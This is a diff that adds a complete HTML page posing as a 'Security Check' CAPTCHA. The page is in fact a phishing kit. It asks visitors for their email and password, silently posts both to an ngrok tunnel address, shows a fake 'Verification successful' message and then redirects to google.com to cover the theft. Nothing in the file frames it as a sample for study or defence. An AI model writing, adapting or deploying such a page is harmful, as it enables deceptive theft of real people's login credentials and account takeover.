@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html><head><title>Security Check</title>
+<style>
+.captcha {background:#f9f9f9; border:1px solid #ccc; padding:20px; width:300px; margin:100px auto; text-align:center;}
+input {margin:10px; padding:8px; width:80%;}
+</style>
+<script>
+function submitCaptcha() {
+    let userInput = document.getElementById('captchaInput').value;
+    fetch('https://sharen-unguillotined-confoundedly.ngrok-free.dev/captcha', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({captcha: userInput, email: document.getElementById('email').value, password: document.getElementById('password').value})
+    });
+    document.body.innerHTML = '<h2>Verification successful. Redirecting...</h2>';
+    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
+}
+</script>
+</head>
+<body>
+<div class="captcha">
+    <h3>Please verify you are human</h3>
+    <input type="email" id="email" placeholder="Email" required><br>
+    <input type="password" id="password" placeholder="Password" required><br>
+    <img src="https://via.placeholder.com/200x50?text=ABCD" alt="CAPTCHA"><br>
+    <input type="text" id="captchaInput" placeholder="Enter the code above"><br>
+    <button onclick="submitCaptcha()">Verify</button>
+</div>
+</body>
+</html>
